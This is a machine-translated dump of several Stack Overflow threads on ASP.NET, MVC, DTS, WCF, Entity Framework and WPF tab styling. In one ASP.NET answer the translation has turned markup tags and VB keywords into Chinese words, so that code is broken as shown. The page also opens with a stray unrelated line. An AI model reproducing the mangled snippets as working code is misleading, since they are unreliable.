（请注意，长 30-50 个字符的按钮会再次开始退化，但它们并不常见）

# asp.net - 中继器中的 AutoCompleteExtender 控件

> ID：561907
> 
> 赞同：2
> 
> 时间：2009-02-18T16:47:55.390
> 
> 标签：asp.net, asp.net-ajax, ajaxcontroltoolkit

我在转发器中有一个**AutoCompleteExtender** AjaxControlToolkit 控件，需要从 Web 服务获取名称和值。自动完成字段需要存储名称，并且有一个隐藏字段需要存储值。当尝试在中继器之外执行此操作时，我通常会让事件**OnClientItemSelected**调用类似于的 javascript 函数

```
function GetItemId(source, eventArgs)
{
   document.getElementById('<%= ddItemId.ClientID %>').value = eventArgs.get_value();
} 
```

但是，由于需要将值存储在转发器的控件中，我需要一些其他方式让 javascript 函数“获取”组件来存储值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-05T19:15:22.170

I've got some JavaScript that might help you. My ASP.Net AutoComplete extender is not in a repeater, but I've modified that code to detect the ID of the TextBox you are going to write the erturned ID to, it should work (but I haven't tested it all the way through to post back). Use the value from 'source' parameter in the client side ItemSelected method. That is the ID of the calling AutoComplete extender. Just make sure that you assign an ID the hidden TextBox in the Repeater Item that is similar to the ID of the extender. Something like this:

```
<asp:Repeater ID="RepeaterCompareItems" runat="server">
    <ItemTemplate>
        <ajaxToolkit:AutoCompleteExtender runat="server" 
           ID="ACE_Item"
           TargetControlID="ACE_Item_Input"
           ...other properties...
           OnClientItemSelected="ACEUpdate_RepeaterItems" />
        <asp:TextBox ID="ACE_Item_Input" runat="server" />
        <asp:TextBox ID="ACE_Item_IDValue" runat="server" style="display: none;" />
    </ItemTemplate>
</asp:Repeater> 
```

Then the JS method would look like this:

```
 function ACEUpdate_CustomerEmail(source, eventArgs) {
            UpdateTextBox = document.getElementById(source.get_id() + '_IDValue');
            //alert('debug = ' + UserIDTextBox);
            UpdateTextBox.value = eventArgs.get_value();
            //alert('customer id = ' + UpdateTextBox.value);
        } 
```

There are extra alert method calls that you can uncomment for testing and remove for production. In a simple and incomplete test page, I got IDs that looked like this: `RepeaterCompareItems_ctl06_ACE_Item_IDValue` (for the text box to store the value) and `RepeaterCompareItems_ctl07_ACE_Item` (for the AC Extender) - yours may be a little different, but it looks practical. Good Luck.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-23T11:05:16.297

如果我正确理解了这个问题，你应该能够做你通常做的事情，但不是嵌入 ClientId，而是使用“源”参数。这应该允许您访问要更新的控件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-05T20:36:49.117

由于您使用的是中继器，我建议连接 OnItemDataBound 函数...

<asp:Repeater id="rptResults" OnItemDataBound="FormatResults" runat="server">

<项目模板>

<asp:PlaceHolder id="phResults" runat="server" />

</ItemTemplate>

</asp:中继器>

然后在后面的代码中使用类似

`Private Sub FormatResults(ByVal sender As Object, ByVal e As RepeaterItemEventArgs)

Dim dr As DataRow = CType(CType(e.Item.DataItem, DataRowView).Row, DataRow) '允许您访问绑定到行 ex 的所有数据。博士（“ID”）.ToString

将 ph 调暗为 PlaceHolder = CType(e.Item.FindControl("phResults"), PlaceHolder)

' 以编程方式创建 AutoCompleteExtender && 设置属性

' 以编程方式创建触发所需 JavaScript 的按钮

' 使用 "ph.Controls.Add( *ctrl* ) 将控件添加到 PlaceHolder

结束子`

瞧

# asp.net-mvc - ASP.Net MVC 的加载页面

> ID：561909
> 
> 赞同：1
> 
> 时间：2009-02-18T16:48:51.580
> 
> 标签：asp.net-mvc

我正在使用 ASP.Net MVC 创建一个网站，该网站需要进行一些处理（5 - 10 秒），然后才能将视图返回给用户。我不想让用户盯着冰川进度条，而是想展示某种“请稍候/我们马上回来”的动画 gif 以保持他们的兴趣。

有谁知道实现这一目标的好方法？

（我找到[了这个](https://stackoverflow.com/questions/287014/asp-net-mvc-loading-in-progress-indicator)答案，但它不是我所需要的，它使用 jQuery 在视图返回后获取数据。我想在他们等待视图出现时显示“请稍候”）

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-18T16:55:05.513

我认为您引用的解决方案对您有用。您只需让初始控制器操作立即返回“请稍候消息”，然后让 AJAX 调用根据您的处理实际检索内容。如果请求确实需要 5-10 秒，您可能还需要调整 AJAX 请求的超时值，使其能够完成。我不知道默认超时是多少，但可能比您需要的要少。

**编辑**示例：

查看代码：

```
<script type="text/javascript">
     $(document).ready( function() {
         $.ajax({
            type: "POST",
            url: '<$= Url.Action("GetSlowData","Controller") %>',
            data: 'id=<%= ViewData["modelID"] %>',
            timeout: 15000,  // wait upto 15 secs
            success: function(content){
               $("#container").html(content);
            }
         });
     });
</script>

...

<div id="#container">
   Please wait while I retrieve the data.
</div> 
```

控制器

```
public ActionResult ViewMyData( int id )
{
     ViewData["modelID"] = id;
     return View();
}

[AcceptVerbs( HttpVerbs.Post )]
public ActionResult GetSlowData( int id )
{
     var model = ... do what you need to do to get the model...

     return PartialView(model);
} 
```

您还需要一个局部视图 (ViewUserControl) 来获取您的模型并呈现模型的视图。请注意，这并不完整——您需要添加错误处理，您可能需要考虑如果未启用 javascript 会发生什么，...

# sql-server - 如何使用 DTS 将 SqlServer 中的二进制数据导出到文件

> ID：561912
> 
> 赞同：1
> 
> 时间：2009-02-18T16:50:06.070
> 
> 标签：sql-server, vbscript, dts

我在 sql server 2000 表中有一个图像列，用于存储 pdf 文件的二进制文件。

我需要使用 SqlServer 2000 DTS 将列中每一行的内容导出到一个实际的物理文件中。

[我在http://www.freevbcode.com/ShowCode.asp?ID=1654&NoBox=True](http://www.freevbcode.com/ShowCode.asp?ID=1654&NoBox=True)找到了以下 vb 方法

```
Set rs = conn.execute("select BinaryData from dbo.theTable")
FileHandle = FreeFile 
Open ("AFile") For Binary As #FileHandle 
ByteLength = LenB(rs("BinaryData")) 
ByteContent = rs("BinaryData").GetChunk(ByteLength)
Put #FileHandle, ,ByteContent 
Close #FileHandle 
```

不幸的是，DTS 脚本任务是 VBSCript，而不是 VB，并且它在第三行中抛出了**AS关键字。**

还有其他想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-19T02:24:23.740

在 VBScript 中编写二进制文件是一项非常困难的任务。VBScript 公开的唯一直接文件操作存在于 FileSystemObject 对象中，该对象仅支持写入文本文件。唯一可行的选择是使用[ADO Stream objects](http://msdn.microsoft.com/en-us/library/ms675032%28VS.85%29.aspx)，这仍然很麻烦，因为 VBScript 不支持将脚本创建的 Byte 数组传递给 COM 对象，这是能够写入任意二进制数据所必需的。

这是一种使用 ADO 流的技术，它可能不起作用，但可能会让您走上正确解决方案的轨道。

```
adTypeBinary = 1

Set rs = CreateObject("ADODB.Recordset")
rs.Open "SELECT binary_data FROM dbo.data_table", "connection string..."
Set strm = CreateObject("ADODB.Stream")
strm.Type = adTypeBinary
strm.Open
strm.Write rs.Fields("binary_data").GetChunk( _
    LenB(rs.Fields("binary_data").Value))
strm.SaveToFile "binarydata.bin"
strm.Close
rs.Close 
```

我使用 Access 试验了这段代码，不幸的是它似乎没有用。我没有得到与我创建的表中相同的二进制数据，但我没有费心进入十六进制编辑器看看有什么不同。

如果您从 ADO 操作中得到错误，您可以通过在脚本顶部添加“On Error Resume Next”并使用此代码来获取[实际消息。](http://msdn.microsoft.com/en-us/library/ms677507(VS.85).aspx)

```
For Each err In rs.ActiveConnection.Errors
    WScript.Echo err.Number & ": " & err.Description
Next 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-18T20:31:14.603

如果可能的话，我会使用 SQL Server Integration Services (SSIS) 而不是 DTS，并使用允许您使用 VB.NET 的脚本任务。

您可以连接到 SQL Server 2000 数据源并将导出的输出指向一个文件。

# wcf-binding - WCF 绑定性能

> ID：561915
> 
> 赞同：13
> 
> 时间：2009-02-18T16:51:33.680
> 
> 标签：wcf-binding, performance

我正在使用基本的 HTTP 绑定。

有谁知道在性能方面哪个是最好的绑定，因为这是我们网站的关键问题？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2009-02-18T16:58:52.133

取决于服务所在的位置。

如果它们在同一台机器上，NetNamedPipeBinding 应该为您提供最大的性能。

否则，您必须根据它们所在的位置、是否必须通过 Internet 通信、互操作性等进行选择。

[Soledad Pano 的博客](http://weblogs.asp.net/spano/archive/2007/10/02/choosing-the-right-wcf-binding.aspx)有一个很好的流程图，可以帮助您根据情况选择合适的绑定

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-02-18T17:01:04.860

这是将苹果与橙子进行比较。例如，如果您使用的是基本 HTTP 绑定，那么就会有一组基本服务以及它提供的其他服务，这与所[`WsHttpBinding`](http://msdn.microsoft.com/en-us/library/system.servicemodel.wshttpbinding.aspx)提供的服务不同。

鉴于此，性能指标会有所不同，但您也不会获得相同的功能，如果您需要特定的功能集，那么根本不值得进行比较。

此外，还有一些绑定（如 net tcp 和命名管道绑定）可能根本不适用，但具有更好的性能特征。

最后，您关于“最佳性能”的陈述表明您确实没有以正确的方式看待它。您对高峰和非高峰时段的负载以及产品可接受的响应时间有预期。您需要确定 WCF 是否在这些参数范围内，然后从那里开始工作，而不仅仅是说“我正在寻找最佳性能”。

你必须对你想做的事情提出更多的要求，然后才能得到更多的启示。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-18T17:03:23.090

WCF 信息的好资源：

[http://www.codeplex.com/WCFSecurity/Wiki/View.aspx?title=Questions%20and%20Answers&referringTitle=Home](http://www.codeplex.com/WCFSecurity/Wiki/View.aspx?title=Questions%20and%20Answers&referringTitle=Home)

有一个关于为您的特定场景选择绑定的部分。安全不是问题吗？如果没有，那么您有更多选择。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-18T17:03:26.913

如果没有其他已知因素（服务器硬件、并发用户数量等），很难判断性能会如何。

例如，HTTP 绑定的性能将比 HTTPS 稍好，但二进制 WCF 到 WCF 的通信将比 HTTP 更快，但兼容性较差。

我认为您需要提供更多详细信息 - 所需的功能是什么（您需要 SOAP 消息交换，还是带有 JSON 的 Ajax？）以及预期的服务器负载。

# xml - 实体框架的本地存储层？

> ID：561916
> 
> 赞同：5
> 
> 时间：2009-02-18T16:51:58.610
> 
> 标签：xml, entity-framework

我一直在为我正在开发的业务应用程序实施一个支持 SQLServer 2005 的 EF 解决方案，并且运行良好。

我遇到了一个问题，我希望允许用户在使用相同实体的同时完全没有数据库的情况下工作。

出于可移植性的原因，我不想去本地数据库。此外，如果它只是一个 XML 文件，通过电子邮件发送一个小型数据库也很容易。

所以，我知道可以从 XML 文件、模式和所有内容中存储和加载 DataSet。有没有办法使用一个（或两个，或三个）XML 文件作为 EF 的存储层？

由于 Entity Framework 是建立在 ADO.Net 之上的，所以我期待有一个 XML 数据提供程序。然后，可以使实体模型运行 XML 文件。我遇到了 DataSet 设计器，它允许我创建模式并从 XML 文件保存和加载，但它没有插入 EF，因为 EF 使用对象服务而不是 DataSet（如果我错了，请纠正我。我读过它[在 MSDN 上](http://msdn.microsoft.com/en-us/library/cc716791.aspx)）。

我确实遇到了[WilsonXmlDbClient 库](http://code.msdn.microsoft.com/WilsonXmlDbClient)，它应该是 ADO.Net 的 XML DataProvider。它似乎很旧，我真的不知道从哪里开始。

我知道 XML 不是任何人存储关系数据的首选，但是，我希望使用 1Mb 或更小的文件。

TIA

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2011-02-02T08:06:20.700

一种方法是使用 Microsoft 的同步框架。[http://msdn.microsoft.com/en-us/sync/default](http://msdn.microsoft.com/en-us/sync/default)。

然后，您将在客户端上使用 SQL Server express 或 Compact Edition。

同步框架以及 SQL Server Express 和 Compact 版本是免费的。

# linq-to-sql - 域对象与其关系表的良好命名约定是什么？

> ID：561920
> 
> 赞同：2
> 
> 时间：2009-02-18T16:53:23.147
> 
> 标签：linq-to-sql, orm, naming-conventions

我现在已经两次看到这个问题，想看看解决这个命名约定的最佳实践是什么。假设我有一个 ORM（在这种情况下是 Linq to SQL），并且我映射了一个名为 User 的表。然后我也创建了名为 User 的 POCO。虽然映射表存在于类似

```
MyApp.Data.User 
```

POCO 位于类似

```
MyApp.Objects.User 
```

我意识到可以在整个代码中对任何一个进行完整的命名空间识别，但是您是否有一个合理的命名约定，以便您可以轻松分辨哪个是表映射，哪个是 POCO？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T18:35:35.757

我用DbUser 等来调用Linq2SQL 对象。
这使得扫描代码并查看哪个是哪个非常容易，并且由于 L2S 数据对象只能在 DataTier 中访问，因此奇怪的命名问题不大。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-18T18:31:39.930

我将映射命名为 UserMapping。

因为就是这样。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2011-06-17T23:45:13.153

或者如何将其命名为 UserModel - 然后您可以使用 VM 版本的 UserModelView。

# wpf - 如何在 WPF 选项卡控件中创建梯形选项卡

> ID：561931
> 
> 赞同：79
> 
> 时间：2009-02-18T16:55:49.770
> 
> 标签：wpf, xaml, tabcontrol

如何在 WPF 选项卡控件中创建梯形选项卡？
我想创建看起来像 Google Chrome 中的标签或 VS 2008 代码编辑器中的标签的非矩形标签。

可以用 WPF 样式完成还是必须用代码绘制？

互联网上有代码示例吗？

**编辑：**

有很多示例显示如何圆角或更改选项卡的颜色，但我找不到任何可以更改选项卡几何形状的示例，如以下两个示例：

**VS 2008 Code Editor Tabs**
![VS 2008 代码编辑器选项卡](https://farm4.static.flickr.com/3470/3290241563_4e45588e10_o.jpg)

**谷歌浏览器标签**
![替代文字](https://farm4.static.flickr.com/3446/3291059608_3e280a0791_o.jpg)

这两个示例中的选项卡不是矩形，而是梯形。

* * *

## 回答 #1

> 赞同：104
> 
> 时间：2009-07-04T22:55:50.110

我试图在互联网上为这个问题找到一些控制模板或解决方案，但我没有找到任何“可接受”的解决方案。所以我以我的方式写了它，这是我第一次（也是最后一次=）尝试这样做的一个例子：

```
<Window x:Class="TabControlTemplate.Window1"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:src="clr-namespace:TabControlTemplate"
    Title="Window1" Width="600" Height="400">
<Window.Background>
    <LinearGradientBrush StartPoint="0,0" EndPoint="1,1">
        <GradientStop Color="#FF3164a5" Offset="1"/>
        <GradientStop Color="#FF8AAED4" Offset="0"/>
    </LinearGradientBrush>
</Window.Background>
<Window.Resources>
    <src:ContentToPathConverter x:Key="content2PathConverter"/>
    <src:ContentToMarginConverter x:Key="content2MarginConverter"/>

    <SolidColorBrush x:Key="BorderBrush" Color="#FFFFFFFF"/>
    <SolidColorBrush x:Key="HoverBrush" Color="#FFFF4500"/>
    <LinearGradientBrush x:Key="TabControlBackgroundBrush" EndPoint="0.5,0" StartPoint="0.5,1">
        <GradientStop Color="#FFa9cde7" Offset="0"/>
        <GradientStop Color="#FFe7f4fc" Offset="0.3"/>
        <GradientStop Color="#FFf2fafd" Offset="0.85"/>
        <GradientStop Color="#FFe4f6fa" Offset="1"/>
    </LinearGradientBrush>
    <LinearGradientBrush x:Key="TabItemPathBrush" StartPoint="0,0" EndPoint="0,1">
        <GradientStop Color="#FF3164a5" Offset="0"/>
        <GradientStop Color="#FFe4f6fa" Offset="1"/>
    </LinearGradientBrush>

    <!-- TabControl style -->
    <Style x:Key="TabControlStyle" TargetType="{x:Type TabControl}">
        <Setter Property="BorderThickness" Value="1"/>
        <Setter Property="Template">
            <Setter.Value>
                <ControlTemplate TargetType="TabControl">
                    <Grid>
                        <Grid.RowDefinitions>
                            <RowDefinition Height="Auto"/>
                            <RowDefinition Height="*"/>
                        </Grid.RowDefinitions>
                        <Border Grid.Row="1" BorderThickness="2,0,2,2" Panel.ZIndex="2" CornerRadius="0,0,2,2"
                                BorderBrush="{StaticResource BorderBrush}"
                                Background="{StaticResource TabControlBackgroundBrush}">
                            <ContentPresenter ContentSource="SelectedContent"/>
                        </Border>
                        <StackPanel Orientation="Horizontal" Grid.Row="0" Panel.ZIndex="1" IsItemsHost="true"/>
                        <Rectangle Grid.Row="0" Height="2" VerticalAlignment="Bottom"
                                   Fill="{StaticResource BorderBrush}"/>
                    </Grid>
                </ControlTemplate>
            </Setter.Value>
        </Setter>
    </Style>
    <!-- TabItem style -->
    <Style x:Key="{x:Type TabItem}" TargetType="{x:Type TabItem}">
        <Setter Property="SnapsToDevicePixels" Value="True"/>
        <Setter Property="Template">
            <Setter.Value>
                <ControlTemplate TargetType="TabItem">
                    <Grid x:Name="grd">
                        <Path x:Name="TabPath" StrokeThickness="2"
                              Margin="{Binding ElementName=TabItemContent, Converter={StaticResource content2MarginConverter}}"
                              Stroke="{StaticResource BorderBrush}"
                              Fill="{StaticResource TabItemPathBrush}">
                            <Path.Data>
                                <PathGeometry>
                                    <PathFigure IsClosed="False" StartPoint="1,0" 
                                                Segments="{Binding ElementName=TabItemContent, Converter={StaticResource content2PathConverter}}">
                                    </PathFigure>
                                </PathGeometry>
                            </Path.Data>
                            <Path.LayoutTransform>
                                <ScaleTransform ScaleY="-1"/>
                            </Path.LayoutTransform>
                        </Path>
                        <Rectangle x:Name="TabItemTopBorder" Height="2" Visibility="Visible"
                                   VerticalAlignment="Bottom" Fill="{StaticResource BorderBrush}"
                                   Margin="{Binding ElementName=TabItemContent, Converter={StaticResource content2MarginConverter}}" />
                        <ContentPresenter x:Name="TabItemContent" ContentSource="Header"
                                          Margin="10,2,10,2" VerticalAlignment="Center"
                                          TextElement.Foreground="#FF000000"/>
                    </Grid>
                    <ControlTemplate.Triggers>
                        <Trigger Property="IsMouseOver" Value="True" SourceName="grd">
                            <Setter Property="Stroke" Value="{StaticResource HoverBrush}" TargetName="TabPath"/>
                        </Trigger>
                        <Trigger Property="Selector.IsSelected" Value="True">
                            <Setter Property="Fill" TargetName="TabPath">
                                <Setter.Value>
                                    <SolidColorBrush Color="#FFe4f6fa"/>
                                </Setter.Value>
                            </Setter>
                            <Setter Property="BitmapEffect">
                                <Setter.Value>
                                    <DropShadowBitmapEffect Direction="302" Opacity="0.4" 
                                                        ShadowDepth="2" Softness="0.5"/>
                                </Setter.Value>
                            </Setter>
                            <Setter Property="Panel.ZIndex" Value="2"/>
                            <Setter Property="Visibility" Value="Hidden" TargetName="TabItemTopBorder"/>
                        </Trigger>
                    </ControlTemplate.Triggers>
                </ControlTemplate>
            </Setter.Value>
        </Setter>
    </Style>
</Window.Resources>
<Grid Margin="20">
    <TabControl Grid.Row="0" Grid.Column="1" Margin="5" TabStripPlacement="Top" 
                Style="{StaticResource TabControlStyle}" FontSize="16">
        <TabItem Header="MainTab">
            <Border Margin="10">
                <TextBlock Text="The quick brown fox jumps over the lazy dog."/>
            </Border>
        </TabItem>
        <TabItem Header="VeryVeryLongTab" />
        <TabItem Header="Tab" />
    </TabControl>
</Grid> 
```

```
using System;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Media;

namespace TabControlTemplate
{
public partial class Window1
{
    public Window1()
    {
        InitializeComponent();
    }
}

public class ContentToMarginConverter: IValueConverter
{
    #region IValueConverter Members

    public object Convert(object value, Type targetType, object parameter, System.Globalization.CultureInfo culture)
    {
        return new Thickness(0, 0, -((ContentPresenter)value).ActualHeight, 0);
    }

    public object ConvertBack(object value, Type targetType, object parameter, System.Globalization.CultureInfo culture)
    {
        throw new NotImplementedException();
    }

    #endregion
}

public class ContentToPathConverter: IValueConverter
{
    #region IValueConverter Members

    public object Convert(object value, Type targetType, object parameter, System.Globalization.CultureInfo culture)
    {
        var ps = new PathSegmentCollection(4);
        ContentPresenter cp = (ContentPresenter)value;
        double h = cp.ActualHeight > 10 ? 1.4 * cp.ActualHeight : 10;
        double w = cp.ActualWidth > 10 ? 1.25 * cp.ActualWidth : 10;
        ps.Add(new LineSegment(new Point(1, 0.7 * h), true));
        ps.Add(new BezierSegment(new Point(1, 0.9 * h), new Point(0.1 * h, h), new Point(0.3 * h, h), true));
        ps.Add(new LineSegment(new Point(w, h), true));
        ps.Add(new BezierSegment(new Point(w + 0.6 * h, h), new Point(w + h, 0), new Point(w + h * 1.3, 0), true));
        return ps;
    }

    public object ConvertBack(object value, Type targetType, object parameter, System.Globalization.CultureInfo culture)
    {
        throw new NotImplementedException();
    }

    #endregion
}
} 
```

我编写的这两个转换器是为了根据其内容调整标签大小。实际上，我根据内容大小制作 Path 对象。如果您不需要具有各种宽度的选项卡，您可以使用一些修改后的副本：

```
<Style x:Key="tabPath" TargetType="{x:Type Path}">
      <Setter Property="Stroke" Value="Black"/>
      <Setter Property="Data">
          <Setter.Value>
              <PathGeometry Figures="M 0,0 L 0,14 C 0,18 2,20 6,20 L 60,20 C 70,20 80,0 84,0"/>
          </Setter.Value>
      </Setter>
  </Style> 
```

屏幕：

![截屏](https://i.stack.imgur.com/ClMla.png)

[示例项目（vs2010）](http://bitbucket.org/rooks/trapezoidtabs)

* * *

## 回答 #2

> 赞同：35
> 
> 时间：2011-01-19T21:46:57.013

**注意：这只是 rooks 出色答案的附录。**

虽然 rooks 的解决方案在运行时对我来说运行良好，但在 VS2010 WPF 设计器界面中打开 MainWindow 时遇到了一些麻烦：设计器抛出异常并且没有显示窗口。此外，TabControl.xaml 中 TabItem 的整个 ControlTemplate 有一条蓝色曲线，并且工具提示告诉我发生了 NullReferenceException。将相关代码移动到我的应用程序中时，我也有同样的行为。问题出在两台不同的机器上，所以我相信这与我的安装问题无关。

如果有人遇到相同的问题，我会找到一个修复程序，以便该示例现在可以在运行时和设计器中运行：

**首先**：在 TabControl-XAML 代码中替换 ...

```
<Path x:Name="TabPath" StrokeThickness="2"
      Margin="{Binding ElementName=TabItemContent,
               Converter={StaticResource content2MarginConverter}}"
      Stroke="{StaticResource BorderBrush}"
      Fill="{StaticResource TabItemPathBrush}">
    <Path.Data>
        <PathGeometry>
            <PathFigure IsClosed="False" StartPoint="1,0" 
                 Segments="{Binding ElementName=TabItemContent,
                            Converter={StaticResource content2PathConverter}}">
            </PathFigure>
        </PathGeometry>
    </Path.Data>
    <Path.LayoutTransform>
        <ScaleTransform ScaleY="-1"/>
    </Path.LayoutTransform>
</Path> 
```

... 经过 ...

```
<Path x:Name="TabPath" StrokeThickness="2"
      Margin="{Binding ElementName=TabItemContent,
               Converter={StaticResource content2MarginConverter}}"
      Stroke="{StaticResource BorderBrush}"
      Fill="{StaticResource TabItemPathBrush}"
      Data="{Binding ElementName=TabItemContent,
             Converter={StaticResource content2PathConverter}}">
    <Path.LayoutTransform>
        <ScaleTransform ScaleY="-1"/>
    </Path.LayoutTransform>
</Path> 
```

**第二**：在ContentToPathConverter类的Convert方法的最后替换...

```
return ps; 
```

... 经过 ...

```
PathFigure figure = new PathFigure(new Point(1, 0), ps, false);
PathGeometry geometry = new PathGeometry();
geometry.Figures.Add(figure);

return geometry; 
```

我无法解释为什么这在设计器中运行稳定，但不是 rooks 的原始代码。

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2012-07-05T18:11:18.207

我刚刚为 WPF 完成了一个类似于 Google Chrome 的选项卡控件。[您可以在https://github.com/realistschuckle/wpfchrometabs](https://github.com/realistschuckle/wpfchrometabs)和描述它的博客文章中找到该项目

*   [类似 Google Chrome 的 WPF 选项卡控件](http://curtis.schlak.com/2012/03/02/custom-wpf-tab-control.html)
*   [WPF 中的 ChromeTabControl 和 Visual Children](http://curtis.schlak.com/2012/03/05/chrome-tabs-and-visual-children.html)
*   [WPF Chrome 选项卡功能](http://curtis.schlak.com/2012/06/29/wpf-chrome-tabs-functioning.html)

希望这可以帮助您更好地了解从头开始构建自定义选项卡控件。

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2009-07-02T21:57:20.060

```
<Grid>
    <Grid.Resources>
        <Style TargetType="{x:Type TabControl}">
            <Setter Property="ItemContainerStyle">
                <Setter.Value>
                    <Style>
                        <Setter Property="Control.Height" Value="20"></Setter>
                        <Setter Property="Control.Template">
                            <Setter.Value>
                                <ControlTemplate TargetType="{x:Type TabItem}">
                                    <Grid Margin="0 0 -10 0">
                                        <Grid.ColumnDefinitions>
                                            <ColumnDefinition Width="10">
                                            </ColumnDefinition>
                                            <ColumnDefinition></ColumnDefinition>
                                            <ColumnDefinition Width="10"></ColumnDefinition>
                                        </Grid.ColumnDefinitions>
                                        <Path Data="M10 0 L 0 20 L 10 20 " Fill="{TemplateBinding Background}" Stroke="Black"></Path>
                                        <Rectangle Fill="{TemplateBinding Background}" Grid.Column="1"></Rectangle>
                                        <Rectangle VerticalAlignment="Top" Height="1" Fill="Black" Grid.Column="1"></Rectangle>
                                        <Rectangle VerticalAlignment="Bottom" Height="1" Fill="Black" Grid.Column="1"></Rectangle>
                                        <ContentPresenter Grid.Column="1" ContentSource="Header" />
                                       <Path Data="M0 20 L 10 20 L0 0" Fill="{TemplateBinding Background}" Grid.Column="2" Stroke="Black"></Path>
                                    </Grid>
                                    <ControlTemplate.Triggers>
                                        <Trigger Property="IsSelected" Value="True">
                                            <Trigger.Setters>
                                                <Setter Property="Background" Value="Beige"></Setter>
                                                <Setter Property="Panel.ZIndex" Value="1"></Setter>
                                            </Trigger.Setters>
                                        </Trigger>
                                        <Trigger Property="IsSelected" Value="False">
                                            <Trigger.Setters>
                                                <Setter Property="Background" Value="LightGray"></Setter>
                                            </Trigger.Setters>
                                        </Trigger>
                                    </ControlTemplate.Triggers>
                                </ControlTemplate>
                            </Setter.Value>
                        </Setter>
                    </Style>
                </Setter.Value>
            </Setter>
        </Style>
    </Grid.Resources>
    <TabControl>
        <TabItem Header="One" ></TabItem>
        <TabItem Header="Two" ></TabItem>
        <TabItem Header="Three" ></TabItem>
    </TabControl>
</Grid> 
```

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2013-12-03T06:26:39.940

我知道这很旧，但我想建议：

![在此处输入图像描述](https://i.stack.imgur.com/IGdcx.jpg)

XAML：

```
 <Window.Resources>

    <ControlTemplate x:Key="trapezoidTab" TargetType="TabItem">
        <Grid>
            <Polygon Name="Polygon_Part" Points="{Binding TabPolygonPoints}" />
            <ContentPresenter Name="TabContent_Part" Margin="{TemplateBinding Margin}" Panel.ZIndex="100" ContentSource="Header" HorizontalAlignment="Center" VerticalAlignment="Center"/>
        </Grid>

        <ControlTemplate.Triggers>

            <Trigger Property="IsMouseOver" Value="False">
                <Setter TargetName="Polygon_Part" Property="Stroke" Value="LightGray"/>
                <Setter TargetName="Polygon_Part" Property="Fill" Value="DimGray" />
            </Trigger>

            <Trigger Property="IsMouseOver" Value="True">
                <Setter TargetName="Polygon_Part" Property="Fill" Value="Goldenrod" />
                <Setter TargetName="Polygon_Part" Property="Stroke" Value="LightGray"/>
            </Trigger>

            <Trigger Property="IsSelected" Value="False">
                <Setter Property="Panel.ZIndex" Value="90"/>
            </Trigger>

            <Trigger Property="IsSelected" Value="True">
                <Setter Property="Panel.ZIndex" Value="100"/>
                <Setter TargetName="Polygon_Part" Property="Stroke" Value="LightGray"/>
                <Setter TargetName="Polygon_Part" Property="Fill" Value="LightSlateGray "/>
            </Trigger>

        </ControlTemplate.Triggers>

    </ControlTemplate>

</Window.Resources>

<!-- Test the tabs-->
<TabControl Name="FruitTab">
    <TabItem Header="Apple" Template="{StaticResource trapezoidTab}" />
    <TabItem Margin="-8,0,0,0" Header="Grapefruit" Template="{StaticResource trapezoidTab}" />
    <TabItem Margin="-16,0,0,0" Header="Pear" Template="{StaticResource trapezoidTab}"/>
</TabControl> 
```

视图模型：

```
 using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Text;
    using System.Threading.Tasks;
    using System.Windows;
    using System.Windows.Shapes;
    using System.ComponentModel;
    using System.Globalization;
    using System.Windows.Media;

    namespace TrapezoidTab
    {
        public class TabHeaderViewModel : INotifyPropertyChanged
        {
            public event PropertyChangedEventHandler PropertyChanged;
            private string _tabHeaderText;
            private List<Point> _polygonPoints;
            private PointCollection _pointCollection;

            public TabHeaderViewModel(string tabHeaderText)
            {
                _tabHeaderText = tabHeaderText;
                TabPolygonPoints = GenPolygon();
            }

            public PointCollection TabPolygonPoints
            {
                get { return _pointCollection; }
                set
                {
                    _pointCollection = value;
                    if (PropertyChanged != null)
                        PropertyChanged(this, new PropertyChangedEventArgs("TabPolygonPoints"));
                }
            }

            public string TabHeaderText
            {
                get { return _tabHeaderText; }
                set
                {
                    _tabHeaderText = value;
                    TabPolygonPoints = GenPolygon();
                    if (PropertyChanged != null)
                        PropertyChanged(this, new PropertyChangedEventArgs("TabHeaderText"));
                }
            }

            private PointCollection GenPolygon()
            {
                var w = new FormattedText(_tabHeaderText, CultureInfo.GetCultureInfo("en-us"), FlowDirection.LeftToRight, new Typeface("Tahoma"), 12, Brushes.Black);
                var width = w.Width + 30;

                _polygonPoints = new List<Point>(4);
                _pointCollection = new PointCollection(4);

                _polygonPoints.Add(new Point(2, 21));
                _polygonPoints.Add(new Point(10, 2));
                _polygonPoints.Add(new Point(width, 2));
                _polygonPoints.Add(new Point(width + 8, 21));

                foreach (var point in _polygonPoints)
                    _pointCollection.Add(point);

                return _pointCollection;
            }
        }
    } 
```

主要的：

```
namespace TrapezoidTab
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();

            foreach (var obj in FruitTab.Items)
            {
                var tab = obj as TabItem;
                if (tab == null) continue;
                tab.DataContext = new TabHeaderViewModel(tab.Header.ToString());
            }
        }
    }
} 
```

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2009-02-18T17:16:22.730

